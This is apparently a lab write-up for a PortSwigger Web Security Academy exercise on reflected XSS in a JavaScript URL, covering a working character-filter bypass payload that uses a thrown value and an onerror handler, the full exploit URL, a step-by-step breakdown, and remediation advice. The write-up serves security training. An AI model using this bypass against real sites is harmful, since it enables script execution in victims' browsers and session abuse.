# Lab: Reflected XSS in a JavaScript URL with Some Characters Blocked

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** Cross-Site Scripting (XSS) – JavaScript URL / Filter Bypass  
**Status:** Solved  
**Tools:** Browser, Burp Suite

## Objective

Exploit a reflected XSS vulnerability in a JavaScript URL by bypassing character restrictions and executing the `alert()` function with the string `1337` included in the alert message.

## Methodology

1. Examined the blog post functionality and identified that user-controlled input was reflected into a JavaScript URL.
2. Investigated the application's input filtering and identified that certain characters were blocked.
3. Tested alternative JavaScript syntax to construct an executable expression without relying on the usual characters used in a basic XSS payload.
4. Used an arrow function and a thrown object to trigger the browser's error-handling behavior.
5. Assigned the `alert` function to the `onerror` handler and supplied `1337` as the thrown value.
6. Used JavaScript type conversion and object properties to complete the payload.
7. Loaded the crafted URL and verified that the alert displayed `1337`.

## Exploit Payload

```javascript
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

### Full URL

```text
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

## Technical Analysis

### 1. Breaking out of the existing JavaScript context

```javascript
'}
```

The initial characters attempt to escape the existing JavaScript structure and introduce a new expression.

### 2. Creating an arrow function

```javascript
x=x=>{...}
```

Defines an arrow function that uses a throw statement to trigger an exception.

### 3. Triggering the error handler

```javascript
throw/**/onerror=alert,1337
```

This expression assigns the `alert` function to the global `onerror` handler and throws the value `1337`.

The browser invokes the error handler, passing the thrown value as an argument. This results in an alert containing `1337`.

### 4. Completing the JavaScript expression

```javascript
toString=x,window+'',{x:''}
```

These expressions help complete the injected JavaScript structure and satisfy the surrounding parsing context.

## Vulnerability

The application reflects user-controlled input into a JavaScript URL without applying sufficient context-aware validation or encoding.

Although certain characters are blocked, the filtering can be bypassed using alternative JavaScript syntax and browser error-handling behavior.

## Impact

Successful exploitation can allow arbitrary JavaScript execution in a victim's browser under the vulnerable application's origin.

Potential consequences include:

- Unauthorized actions using the victim's authenticated session.
- Access to information available to JavaScript.
- Manipulation of application content.
- Further client-side attacks.

## Remediation

- Avoid placing untrusted input inside JavaScript URLs.
- Reject dangerous URL schemes, including `javascript:`.
- Use strict URL allowlisting and validation.
- Apply context-aware output encoding.
- Avoid blacklist-based character filtering.
- Use safe DOM APIs and a restrictive Content Security Policy as additional defenses.

## Evidence

- [ ] Screenshot of the crafted URL.
- [ ] Screenshot showing the successful alert containing `1337`.
- [ ] Burp Suite evidence showing the reflected input.

## Lab Reference

PortSwigger Web Security Academy – Reflected XSS in a JavaScript URL with some characters blocked.
